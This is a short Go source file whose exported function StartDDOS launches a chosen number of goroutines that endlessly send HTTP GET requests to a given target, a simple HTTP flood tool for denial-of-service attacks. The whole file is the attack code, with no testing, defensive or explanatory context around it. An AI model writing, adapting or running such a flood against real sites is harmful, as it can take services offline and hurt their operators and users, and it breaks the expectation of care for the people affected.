package loading

import (
	"fmt"
	"net/http"
	"sync"
	"time"
)

func reachTarget(target string) {
	_, err := http.Get(target)

	if err != nil {
		fmt.Println("Error:", err)

		return
	}

	fmt.Printf("Reaching %v target...\n", target)

	time.Sleep(100 * time.Millisecond)
}

func StartDDOS(target string, threads int) {
	var wg sync.WaitGroup

	wg.Add(threads)

	for i := 0; i < threads; i++ {
		go func() {
			defer wg.Done()

			for {
				reachTarget(target)
			}
		}()
	}

	wg.Wait()
}
